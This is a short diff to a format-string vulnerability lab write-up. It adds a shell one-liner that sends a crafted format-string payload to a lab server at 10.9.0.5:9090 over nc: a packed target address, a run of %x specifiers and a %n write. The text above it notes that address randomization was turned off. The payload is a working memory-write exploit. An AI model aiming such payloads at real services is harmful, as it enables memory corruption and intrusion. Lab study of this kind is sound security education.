@@ -1,5 +1,7 @@
 # Format-String Vulnerability Lab
 
+echo $(printf " \x68\x50\x0e\x08") %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%20242x.%n | nc 10.9.0.5 9090
+
 ## Environment Setup
 
 First, we turned off the address randomization:
